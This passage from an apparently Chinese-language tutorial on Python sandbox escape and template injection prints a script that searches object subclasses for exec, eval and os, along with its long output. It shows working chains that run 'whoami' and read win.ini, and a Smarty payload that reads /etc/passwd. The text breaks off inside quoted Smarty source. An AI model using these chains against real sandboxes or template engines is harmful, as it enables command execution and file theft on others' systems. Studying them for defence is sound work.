'__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open'] all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions)) all_modules = list(set(list(find_modules.keys()) + target_modules)) subclasses = ().__class__.__bases__[0].__subclasses__() sub_name = [s.__name__ for s in subclasses] # 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read() print('----------1-----------') for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target) print('----------2-----------') # 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls') for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: pass print('----------3-----------') # 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").system(\"ls\")') for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: pass print('----------4-----------') # 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\") # &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似 for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass ----------2----------- 75 &lt;class '_frozen_importlib._ModuleLock'&gt; __builtins__ None 75 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ None 75 &lt;class '_frozen_importlib._ModuleLock'&gt; sys None 76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __builtins__ None 76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ None 76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; sys None 77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __builtins__ None 77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ None 77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; sys None 78 &lt;class '_frozen_importlib._installed_safely'&gt; __builtins__ None 78 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ None 78 &lt;class '_frozen_importlib._installed_safely'&gt; sys None 79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __builtins__ None 79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ None 79 &lt;class '_frozen_importlib.ModuleSpec'&gt; sys None 91 &lt;class '_frozen_importlib_external.FileLoader'&gt; __builtins__ None 91 &lt;class '_frozen_importlib_external.FileLoader'&gt; sys None 92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __builtins__ None 92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; sys None 93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __builtins__ None 93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; sys None 95 &lt;class '_frozen_importlib_external.FileFinder'&gt; __builtins__ None 95 &lt;class '_frozen_importlib_external.FileFinder'&gt; sys None 103 &lt;class 'codecs.IncrementalEncoder'&gt; __builtins__ None 103 &lt;class 'codecs.IncrementalEncoder'&gt; sys None 103 &lt;class 'codecs.IncrementalEncoder'&gt; open None 104 &lt;class 'codecs.IncrementalDecoder'&gt; __builtins__ None 104 &lt;class 'codecs.IncrementalDecoder'&gt; sys None 104 &lt;class 'codecs.IncrementalDecoder'&gt; open None 105 &lt;class 'codecs.StreamReaderWriter'&gt; __builtins__ None 105 &lt;class 'codecs.StreamReaderWriter'&gt; sys None 105 &lt;class 'codecs.StreamReaderWriter'&gt; open None 106 &lt;class 'codecs.StreamRecoder'&gt; __builtins__ None 106 &lt;class 'codecs.StreamRecoder'&gt; sys None 106 &lt;class 'codecs.StreamRecoder'&gt; open None 128 &lt;class 'os._wrap_close'&gt; __builtins__ None 128 &lt;class 'os._wrap_close'&gt; sys None 128 &lt;class 'os._wrap_close'&gt; open None 129 &lt;class '_sitebuiltins.Quitter'&gt; __builtins__ None 129 &lt;class '_sitebuiltins.Quitter'&gt; sys None 130 &lt;class '_sitebuiltins._Printer'&gt; __builtins__ None 130 &lt;class '_sitebuiltins._Printer'&gt; sys None 137 &lt;class 'types.DynamicClassAttribute'&gt; __builtins__ None 138 &lt;class 'types._GeneratorWrapper'&gt; __builtins__ None 139 &lt;class 'warnings.WarningMessage'&gt; __builtins__ None 139 &lt;class 'warnings.WarningMessage'&gt; sys None 140 &lt;class 'warnings.catch_warnings'&gt; __builtins__ None 140 &lt;class 'warnings.catch_warnings'&gt; sys None 167 &lt;class 'reprlib.Repr'&gt; __builtins__ None 174 &lt;class 'functools.partialmethod'&gt; __builtins__ None 176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __builtins__ None 176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; sys None 177 &lt;class 'contextlib._BaseExitStack'&gt; __builtins__ None 177 &lt;class 'contextlib._BaseExitStack'&gt; sys None ----------3----------- 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; eval 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; compile 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; eval 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; compile 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; eval 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; compile 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; eval 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; compile 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; eval 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; compile 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; eval 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; compile 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; __import__ 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; eval 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; compile 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __import__ 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; eval 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; compile 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __import__ 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; eval 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; compile 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; __import__ 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; eval 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; compile 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; __import__ 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open 103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; eval 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; compile 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; __import__ 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open 104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; eval 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; compile 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; __import__ 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open 105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; exec 106 7 &lt;class 'codecs.StreamRecoder'&gt; eval 106 7 &lt;class 'codecs.StreamRecoder'&gt; compile 106 7 &lt;class 'codecs.StreamRecoder'&gt; __import__ 106 7 &lt;class 'codecs.StreamRecoder'&gt; open 106 56 &lt;class 'codecs.StreamRecoder'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; exec 128 1 &lt;class 'os._wrap_close'&gt; file 128 1 &lt;class 'os._wrap_close'&gt; open 128 7 &lt;class 'os._wrap_close'&gt; exec 128 7 &lt;class 'os._wrap_close'&gt; eval 128 7 &lt;class 'os._wrap_close'&gt; compile 128 7 &lt;class 'os._wrap_close'&gt; __import__ 128 7 &lt;class 'os._wrap_close'&gt; open 128 11 &lt;class 'os._wrap_close'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec 129 7 &lt;class '_sitebuiltins.Quitter'&gt; eval 129 7 &lt;class '_sitebuiltins.Quitter'&gt; compile 129 7 &lt;class '_sitebuiltins.Quitter'&gt; __import__ 129 7 &lt;class '_sitebuiltins.Quitter'&gt; open 130 7 &lt;class '_sitebuiltins._Printer'&gt; exec 130 7 &lt;class '_sitebuiltins._Printer'&gt; eval 130 7 &lt;class '_sitebuiltins._Printer'&gt; compile 130 7 &lt;class '_sitebuiltins._Printer'&gt; __import__ 130 7 &lt;class '_sitebuiltins._Printer'&gt; open 137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec 137 7 &lt;class 'types.DynamicClassAttribute'&gt; eval 137 7 &lt;class 'types.DynamicClassAttribute'&gt; compile 137 7 &lt;class 'types.DynamicClassAttribute'&gt; __import__ 137 7 &lt;class 'types.DynamicClassAttribute'&gt; open 138 7 &lt;class 'types._GeneratorWrapper'&gt; exec 138 7 &lt;class 'types._GeneratorWrapper'&gt; eval 138 7 &lt;class 'types._GeneratorWrapper'&gt; compile 138 7 &lt;class 'types._GeneratorWrapper'&gt; __import__ 138 7 &lt;class 'types._GeneratorWrapper'&gt; open 139 7 &lt;class 'warnings.WarningMessage'&gt; exec 139 7 &lt;class 'warnings.WarningMessage'&gt; eval 139 7 &lt;class 'warnings.WarningMessage'&gt; compile 139 7 &lt;class 'warnings.WarningMessage'&gt; __import__ 139 7 &lt;class 'warnings.WarningMessage'&gt; open 140 7 &lt;class 'warnings.catch_warnings'&gt; exec 140 7 &lt;class 'warnings.catch_warnings'&gt; eval 140 7 &lt;class 'warnings.catch_warnings'&gt; compile 140 7 &lt;class 'warnings.catch_warnings'&gt; __import__ 140 7 &lt;class 'warnings.catch_warnings'&gt; open 167 7 &lt;class 'reprlib.Repr'&gt; exec 167 7 &lt;class 'reprlib.Repr'&gt; eval 167 7 &lt;class 'reprlib.Repr'&gt; compile 167 7 &lt;class 'reprlib.Repr'&gt; __import__ 167 7 &lt;class 'reprlib.Repr'&gt; open 174 7 &lt;class 'functools.partialmethod'&gt; exec 174 7 &lt;class 'functools.partialmethod'&gt; eval 174 7 &lt;class 'functools.partialmethod'&gt; compile 174 7 &lt;class 'functools.partialmethod'&gt; __import__ 174 7 &lt;class 'functools.partialmethod'&gt; open 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; eval 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; compile 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __import__ 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open 177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec 177 7 &lt;class 'contextlib._BaseExitStack'&gt; eval 177 7 &lt;class 'contextlib._BaseExitStack'&gt; compile 177 7 &lt;class 'contextlib._BaseExitStack'&gt; __import__ 177 7 &lt;class 'contextlib._BaseExitStack'&gt; open ----------4----------- 140 exec 140 eval 140 compile 140 __import__ 140 open 筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上 ----------2----------- 103 &lt;class 'codecs.IncrementalEncoder'&gt; open None 104 &lt;class 'codecs.IncrementalDecoder'&gt; open None 105 &lt;class 'codecs.StreamReaderWriter'&gt; open None 106 &lt;class 'codecs.StreamRecoder'&gt; open None 128 &lt;class 'os._wrap_close'&gt; open None ----------3----------- 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec 103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec 104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec 105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; exec 106 56 &lt;class 'codecs.StreamRecoder'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; exec 128 7 &lt;class 'os._wrap_close'&gt; open 128 7 &lt;class 'os._wrap_close'&gt; exec 128 11 &lt;class 'os._wrap_close'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec 130 7 &lt;class '_sitebuiltins._Printer'&gt; open 130 7 &lt;class '_sitebuiltins._Printer'&gt; exec 137 7 &lt;class 'types.DynamicClassAttribute'&gt; open 137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec 138 7 &lt;class 'types._GeneratorWrapper'&gt; open 138 7 &lt;class 'types._GeneratorWrapper'&gt; exec 139 7 &lt;class 'warnings.WarningMessage'&gt; open 139 7 &lt;class 'warnings.WarningMessage'&gt; exec 140 7 &lt;class 'warnings.catch_warnings'&gt; open 140 7 &lt;class 'warnings.catch_warnings'&gt; exec 167 7 &lt;class 'reprlib.Repr'&gt; open 167 7 &lt;class 'reprlib.Repr'&gt; exec 174 7 &lt;class 'functools.partialmethod'&gt; open 174 7 &lt;class 'functools.partialmethod'&gt; exec 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec 177 7 &lt;class 'contextlib._BaseExitStack'&gt; open 177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec ----------4----------- 140 open 140 exec 既然筛选出来，那么选其中一个利用来读取文件： &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[103] &lt;class 'codecs.IncrementalEncoder'&gt; 完整执行 &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['open'](\"C:\\\\windows\\\\win.ini\").read() '; for 16-bit app support [fonts] [extensions] [mciextensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CM C=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [xianshuabao] client_uuid={xxx} ' 执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。 &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"whoami\")') misaki\\user 5.2 python2 python2.7的模块(252) bsddb compiler ctypes curses ...... webbrowser.py whichdb.py wsgiref.egg-info xdrlib.py xmllib.py xmlrpclib.py zipfile.py 同样利用原代码进行筛选 ----------1----------- (40, 'file') ----------2----------- (59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None) (59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None) (59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None) (60, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None) (60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__']) (61, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None) (62, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None) (72, &lt;class 'site._Printer'&gt;, '__builtins__', None) (72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open']) (72, &lt;class 'site._Printer'&gt;, 'sys', None) (77, &lt;class 'site.Quitter'&gt;, '__builtins__', None) (77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__']) (77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open']) (77, &lt;class 'site.Quitter'&gt;, 'sys', None) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None) ----------3----------- (59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, '__import__') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'compile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'compile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, '__import__') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'compile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile') (72, 20, &lt;class 'site._Printer'&gt;, 'file') (72, 20, &lt;class 'site._Printer'&gt;, 'exec') (72, 23, &lt;class 'site._Printer'&gt;, '__import__') (72, 23, &lt;class 'site._Printer'&gt;, 'file') (72, 23, &lt;class 'site._Printer'&gt;, 'compile') (72, 23, &lt;class 'site._Printer'&gt;, 'eval') (72, 23, &lt;class 'site._Printer'&gt;, 'open') (72, 23, &lt;class 'site._Printer'&gt;, 'execfile') (77, 20, &lt;class 'site.Quitter'&gt;, 'file') (77, 20, &lt;class 'site.Quitter'&gt;, 'exec') (77, 23, &lt;class 'site.Quitter'&gt;, '__import__') (77, 23, &lt;class 'site.Quitter'&gt;, 'file') (77, 23, &lt;class 'site.Quitter'&gt;, 'compile') (77, 23, &lt;class 'site.Quitter'&gt;, 'eval') (77, 23, &lt;class 'site.Quitter'&gt;, 'open') (77, 23, &lt;class 'site.Quitter'&gt;, 'execfile') (78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile') (79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile') ----------4----------- (60, '__import__') (60, 'file') (60, 'repr') (60, 'compile') (60, 'eval') (60, 'open') (60, 'execfile') 进一步获取可以直接执行命令或者读取文件的类 ----------1----------- (40, 'file') ----------2----------- (59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open']) (77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__']) (77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open']) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None) ----------3----------- (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile') (72, 20, &lt;class 'site._Printer'&gt;, 'file') (72, 20, &lt;class 'site._Printer'&gt;, 'exec') (72, 23, &lt;class 'site._Printer'&gt;, 'file') (72, 23, &lt;class 'site._Printer'&gt;, 'eval') (72, 23, &lt;class 'site._Printer'&gt;, 'open') (72, 23, &lt;class 'site._Printer'&gt;, 'execfile') (77, 20, &lt;class 'site.Quitter'&gt;, 'file') (77, 20, &lt;class 'site.Quitter'&gt;, 'exec') (77, 23, &lt;class 'site.Quitter'&gt;, 'file') (77, 23, &lt;class 'site.Quitter'&gt;, 'eval') (77, 23, &lt;class 'site.Quitter'&gt;, 'open') (77, 23, &lt;class 'site.Quitter'&gt;, 'execfile') (78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile') (79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile') ----------4----------- (60, 'file') (60, 'repr') (60, 'eval') (60, 'open') (60, 'execfile') 选取其中一个执行命令，__mro__输出父类，最后一个父类为object &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72] &lt;class 'site._Printer'&gt; &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].system('whoami') misaki\\user 读取文件 &gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['__builtins__']['file'](\"C:\\\\windows\\\\win.ini\").read()'; for 16-bit app support [fonts] [extensions] [mciextensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessagin 其中还可以执行的模块还有很多，比如使用含有__builtins__的其他模块，来调用加载的os等。 筛选代码来源：Python沙箱逃逸总结 参考：https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#python2 五、PHP-smarty模板 Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function) 但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法 smarty/libs/sysplugins/smarty_internal_data.php ——&gt; getStreamVariable() 这个方法可以获取传入变量的流 这个函数流程大致为：打开你输入的文件$variable，判断文件名是否存在，存在的话在循环中读取到文件全部内容，赋值给变量result，如果不存在则看变量smarty，抛出不同问题，分别为，文件不存在或者文件内容为空 因此我们可以用这个方法读文件，payload: {self::getStreamVariable(\"file:///etc/passwd\")} 同样 smarty/libs/sysplugins/smarty_internal_write_file.php ——&gt; Smarty_Internal_Write_File 这个类中有一个writeFile方法 class Smarty_Internal_Write_File { /** * Writes file in a safe way to disk * * @param string $_filepath complete filepath * @param string $_contents file content * @param Smarty $smarty smarty instance * * @throws SmartyException * @return boolean true */ public function writeFile($_filepath, $_contents, Smarty $smarty) { $_error_reporting = error_reporting(); error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING); if ($smarty-&gt;_file_perms !== null) { $old_umask = umask(0); } $_dirpath = dirname($_filepath); // if subdirs, create dir structure if ($_dirpath !== '.' &amp;&amp; 